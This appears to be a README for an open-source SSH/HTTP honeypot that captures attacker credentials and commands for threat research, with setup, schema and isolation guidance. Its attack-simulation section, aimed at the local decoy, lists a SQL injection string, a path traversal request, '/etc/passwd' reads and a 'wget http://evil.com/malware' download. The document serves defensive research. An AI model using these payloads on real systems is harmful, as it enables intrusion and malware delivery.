# 🍯 Network Honeypot - SSH/HTTP Decoy System

![Python](https://img.shields.io/badge/python-3.11+-blue.svg)
![License](https://img.shields.io/badge/license-MIT-green.svg)
![Status](https://img.shields.io/badge/status-production--ready-success.svg)

## 📋 Project Overview

**Production-grade network deception system** that simulates vulnerable enterprise services (HTTP login portal + SSH server) to capture attacker credentials, commands, and payloads with **zero false positives**. Built for security research, threat intelligence collection, and studying adversary TTPs (Tactics, Techniques, and Procedures).

### ✨ Key Features

- **🎭 Dual Protocol Decoys**
  - HTTP fake login portal (Flask) on port 8080
  - SSH interactive shell simulator (Paramiko) on port 2222
  
- **🔒 Enterprise-Grade Security**
  - Zero command execution (all responses pre-generated)
  - Bcrypt password hashing (never plaintext storage)
  - Thread-safe concurrent session handling
  - Graceful offline operation

- **📊 Comprehensive Telemetry**
  - UUID-based session tracking
  - Real-time credential harvesting
  - Command/payload classification
  - MITRE ATT&CK technique mapping
  - GeoIP enrichment (with offline fallback)

- **💾 SQLite Storage**
  - Normalized schema (sessions, auth_attempts, interactions, ip_intel)
  - WAL mode for concurrent read/write
  - Full-text attack pattern search

- **📈 Analytics Dashboard**
  - Real-time statistics and charts
  - Session logs with command playback
  - Geographic attack heatmap
  - JSON API for SIEM integration

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    ATTACKER / INTERNET                       │
└──────────┬──────────────────────┬───────────────────────────┘
           │                      │
           ▼                      ▼
    ┌────────────┐         ┌────────────┐
    │ HTTP Decoy │         │ SSH Decoy  │
    │ Port 8080  │         │ Port 2222  │
    │ (Flask)    │         │ (Paramiko) │
    └──────┬─────┘         └──────┬─────┘
           │                      │
           └──────────┬───────────┘
                      ▼
            ┌──────────────────┐
            │ Session Manager  │
            │ Event Tracking   │
            └────────┬─────────┘
                     ▼
            ┌──────────────────┐
            │ Attack Classifier│
            │ MITRE ATT&CK Map │
            └────────┬─────────┘
                     ▼
            ┌──────────────────┐
            │  IP Enrichment   │
            │  GeoIP2/MaxMind  │
            └────────┬─────────┘
                     ▼
            ┌──────────────────┐
            │ SQLite Database  │
            │   (WAL mode)     │
            └────────┬─────────┘
                     │
        ┌────────────┴────────────┐
        ▼                         ▼
┌──────────────┐        ┌──────────────┐
│  Dashboard   │        │     API      │
│ (Port 5000)  │        │  /api/stats  │
└──────────────┘        └──────────────┘
```

---

## 🚀 Quick Start

### Prerequisites

- **Python 3.11+** (3.9+ may work but untested)
- **pip** package manager
- **Git** (for cloning)

### Installation

```bash
# 1. Clone repository
git clone https://github.com/yourusername/honeypot.git
cd honeypot

# 2. Create virtual environment
python -m venv venv

# Windows:
venv\Scripts\activate

# Linux/Mac:
source venv/bin/activate

# 3. Install dependencies
pip install -r requirements.txt

# 4. Create configuration
copy .env.example .env
# (Linux/Mac: cp .env.example .env)

# Edit .env if needed (defaults work for localhost testing)
```

### Running the Honeypot

```bash
# Start both HTTP and SSH decoys
python -m app.main
```

**Expected Output:**
```
============================================================
🍯 Network Honeypot - SSH/HTTP Decoy System
============================================================

[✓] Configuration validated
[✓] Data directory: data

============================================================
ACTIVE DECOYS:
============================================================
  • HTTP Decoy:  http://0.0.0.0:8080
  • SSH Decoy:   ssh://0.0.0.0:2222

============================================================
⚠️  DEPLOYMENT WARNING:
============================================================
  • Only deploy on networks you own/have authorization for
  • Run in isolated environment (DMZ/VLAN)
  • Monitor logs regularly for novel attack patterns
  • Captured credentials are sensitive - handle securely

Press Ctrl+C to stop
============================================================

[*] Starting HTTP Decoy on 0.0.0.0:8080
[*] Starting SSH Decoy on 0.0.0.0:2222
[*] Database: data/honeypot.db
[*] Fake login portal ready - waiting for attackers...
[*] Fake SSH shell ready - waiting for attackers...
```

### Testing the Installation

**Option 1: Manual Testing**

Open browser to `http://localhost:8080` and try logging in:
- Username: `admin`
- Password: `test123`

Try SSH connection:
```bash
ssh root@localhost -p 2222
# Password: anything
```

**Option 2: Automated Testing**

```bash
# In a NEW terminal (keep honeypot running):
python scripts/test_honeypot.py
```

**Option 3: Full Attack Simulation**

```bash
# Comprehensive test with 30+ simulated attacks:
python scripts/simulate_attacks.py
```

### Viewing Captured Data

**Start the Dashboard:**
```bash
# In a NEW terminal:
python -m app.dashboard.app
```

Open browser: `http://localhost:5000`

**Query Database Directly:**
```bash
# View sessions
sqlite3 data/honeypot.db "SELECT * FROM sessions ORDER BY started_at DESC LIMIT 5;"

# View captured credentials (hashed)
sqlite3 data/honeypot.db "SELECT username, timestamp FROM auth_attempts ORDER BY timestamp DESC LIMIT 10;"

# View SSH commands with classification
sqlite3 data/honeypot.db "
SELECT command, command_classification, fake_output 
FROM interactions 
WHERE interaction_type='ssh_command' 
LIMIT 10;
"

# View attack statistics
sqlite3 data/honeypot.db "
SELECT 
    (SELECT COUNT(*) FROM sessions) as total_sessions,
    (SELECT COUNT(*) FROM auth_attempts) as credentials_captured,
    (SELECT COUNT(*) FROM interactions) as total_interactions;
"
```

---

## 📂 Project Structure

```
honeypot/
├── app/
│   ├── main.py                      # Entry point - orchestrator
│   ├── core/
│   │   ├── config.py                # Environment configuration
│   │   ├── session.py               # Session state management
│   │   └── classifiers.py           # Attack pattern classification
│   ├── decoy_http/
│   │   └── server.py                # Flask HTTP decoy + routes
│   ├── decoy_ssh/
│   │   ├── server.py                # Paramiko SSH server
│   │   ├── shell.py                 # Interactive shell simulator
│   │   └── banners.py               # Fake SSH banners/MOTD
│   ├── storage/
│   │   └── database.py              # SQLite operations
│   ├── enrichment/
│   │   └── ip_lookup.py             # GeoIP enrichment
│   └── dashboard/
│       ├── app.py                   # Analytics Flask app
│       └── templates/               # Dashboard HTML
│           ├── dashboard.html       # Overview page
│           ├── sessions.html        # Session list
│           └── session_detail.html  # Detailed session view
├── scripts/
│   ├── test_honeypot.py            # Basic verification tests
│   └── simulate_attacks.py         # Comprehensive attack simulation
├── docs/
│   ├── ARCHITECTURE.md             # System design deep-dive
│   └── TEAM_WALKTHROUGH.md         # Code walkthrough for team
├── data/                           # Runtime data (git-ignored)
│   ├── honeypot.db                 # SQLite database
│   └── ssh_host_rsa_key            # Generated SSH host key
├── requirements.txt                # Python dependencies
├── .env.example                    # Configuration template
├── .gitignore                      # Git exclusions
├── PLAN.md                         # Implementation roadmap
├── QUICKSTART.md                   # 5-minute guide
└── README.md                       # This file
```

---

## 🔧 Configuration

Edit `.env` to customize behavior:

```bash
# HTTP Decoy
HTTP_DECOY_ENABLED=true
HTTP_PORT=8080
HTTP_HOST=0.0.0.0

# SSH Decoy
SSH_DECOY_ENABLED=true
SSH_PORT=2222
SSH_HOST=0.0.0.0

# Database
DATABASE_PATH=data/honeypot.db

# Session Limits
MAX_CONCURRENT_SESSIONS=100
SESSION_IDLE_TIMEOUT_SECONDS=300
SESSION_MAX_DURATION_SECONDS=1800

# Rate Limiting
RATE_LIMIT_PER_IP=10
RATE_LIMIT_WINDOW_SECONDS=60

# IP Enrichment (optional)
GEOIP_DB_PATH=data/GeoLite2-City.mmdb

# Dashboard
DASHBOARD_ENABLED=false
DASHBOARD_PORT=5000
DASHBOARD_HOST=127.0.0.1
```

---

## 🧪 Attack Simulation Examples

### HTTP Attacks

```bash
# SQL Injection
curl "http://localhost:8080/search?id=1' OR '1'='1"

# Path Traversal
curl "http://localhost:8080/../etc/passwd"

# WordPress Scan
curl "http://localhost:8080/wp-admin"

# Credential Stuffing
curl -X POST http://localhost:8080/login \
  -d "username=admin&password=admin123" \
  -H "User-Agent: HackerBot/1.0"
```

### SSH Attacks

```bash
# Brute Force
ssh admin@localhost -p 2222
# Try passwords: admin, password, 123456

# Interactive Session (after auth failure, some honeypots still give shell)
ssh root@localhost -p 2222
# Commands to test:
whoami
uname -a
cat /etc/passwd
wget http://evil.com/malware
```

---

## 📊 Database Schema

### Core Tables

**sessions** - Connection metadata
- `session_id` (UUID), `source_ip`, `source_port`, `dest_port`
- `protocol` ('http' | 'ssh'), `started_at`, `ended_at`, `duration_seconds`
- `user_agent`, `ssh_client_version`, `total_interactions`

**auth_attempts** - Credential capture
- `attempt_id`, `session_id`, `timestamp`
- `username`, `password_hash` (bcrypt), `auth_method`, `success` (always 0)

**interactions** - Commands & HTTP payloads
- `interaction_id`, `session_id`, `timestamp`, `interaction_type`
- SSH: `command`, `command_classification`, `fake_output`
- HTTP: `http_method`, `http_path`, `http_query_params`, `http_body`, `attack_signature`

**ip_intel** - Enrichment cache
- `ip_address`, `last_updated`, `country_code`, `country_name`
- `city`, `latitude`, `longitude`, `asn`, `asn_org`
- `total_sessions`, `first_seen`, `last_seen`

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for complete schema and indexes.

---

## 🛡️ Security & Deployment

### ⚠️ CRITICAL WARNINGS

1. **Authorized Use Only**
   - Deploy only on networks you own or have written authorization to monitor
   - Unauthorized honeypot deployment may violate wiretapping laws
   - Check local regulations (GDPR, CCPA, etc.)

2. **Isolated Environment**
   - Run in DMZ or isolated VLAN
   - No access to production systems
   - Firewall rules: inbound only on decoy ports, block all outbound

3. **Credential Handling**
   - Passwords stored as bcrypt hashes (never plaintext)
   - Attackers may reuse victim passwords - handle with care
   - Implement data retention policies (30/60/90 days)

4. **Network Isolation Example**
   ```bash
   # Firewall rules (iptables example):
   iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
   iptables -A INPUT -p tcp --dport 2222 -j ACCEPT
   iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
   iptables -A OUTPUT -j DROP  # Block all outbound
   ```

5. **Non-Privileged Ports**
   - Default: 8080 (HTTP), 2222 (SSH) - no root required
   - To bind to 80/22: use `setcap` or Docker

### Safe Deployment

```bash
# Create dedicated user
sudo useradd -r -s /bin/false honeypot
sudo chown -R honeypot:honeypot /opt/honeypot

# Run as non-root
sudo -u honeypot python -m app.main

# Optional: Bind to privileged ports with capabilities
sudo setcap 'cap_net_bind_service=+ep' $(which python3)
```

### Docker Deployment (Recommended)

```dockerfile
# Dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
EXPOSE 8080 2222 5000
CMD ["python", "-m", "app.main"]
```

```bash
docker build -t honeypot .
docker run -d -p 8080:8080 -p 2222:2222 -v $(pwd)/data:/app/data honeypot
```

---

## 📈 Threat Intelligence Use Cases

### 1. Botnet Tracking
Monitor credential dictionaries and command sequences to identify bot families (Mirai, Gafgyt, etc.)

### 2. Zero-Day Discovery
Capture novel exploit attempts targeting unknown vulnerabilities

### 3. TTP Analysis
Map attacker behavior to MITRE ATT&CK framework for threat modeling

### 4. Early Warning System
Detect reconnaissance activity before production systems are targeted

### 5. Threat Feed Generation
Export attack data to SIEM/SOAR platforms for correlation

---

## 🤝 Contributing

Contributions welcome! Areas for enhancement:

- **Additional Decoys**: FTP, Telnet, RDP, SMTP
- **Advanced Enrichment**: AbuseIPDB, GreyNoise, Shodan integration
- **Machine Learning**: Behavioral clustering, anomaly detection
- **Threat Feeds**: MISP event generation, STIX/TAXII export
- **Visualization**: Real-time attack maps, D3.js charts

---

## 📄 License

MIT License - See LICENSE file

**Disclaimer**: This tool is for authorized security research and educational purposes only. Users are responsible for ensuring compliance with applicable laws and regulations.

---

## 📚 Documentation

- **[QUICKSTART.md](QUICKSTART.md)** - Get running in 5 minutes
- **[PLAN.md](PLAN.md)** - 4-phase implementation roadmap
- **[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)** - System design and database schema
- **[docs/TEAM_WALKTHROUGH.md](docs/TEAM_WALKTHROUGH.md)** - Complete code walkthrough

---

## 🙏 Acknowledgments

- **SANS Internet Storm Center** - Honeypot research and best practices
- **MITRE ATT&CK** - Adversarial TTP framework
- **Cowrie** - SSH/Telnet honeypot inspiration
- **MaxMind GeoLite2** - Free geolocation database
- **Paramiko** - Python SSH implementation

---

## 📞 Support & Contact

- **Issues**: [GitHub Issues](https://github.com/yourusername/honeypot/issues)
- **Questions**: See documentation in `docs/` folder
- **Security**: Report vulnerabilities responsibly via GitHub Security tab

---

## 🎯 Project Status

**Current Version**: 1.0.0 (All 4 phases complete)

✅ Phase 1: HTTP Decoy & Storage  
✅ Phase 2: SSH Decoy & Interactive Shell  
✅ Phase 3: IP Enrichment & Classification  
✅ Phase 4: Analytics Dashboard & API  

**Tested On**:
- Windows 11 (Python 3.11)
- Ubuntu 22.04 LTS (Python 3.11)
- macOS Ventura (Python 3.11)

---

<div align="center">

**⚠️ Use Responsibly | 🔒 Handle Captured Data Securely | 📊 Share Threat Intel with Community**

Made with ❤️ for the security research community

</div>
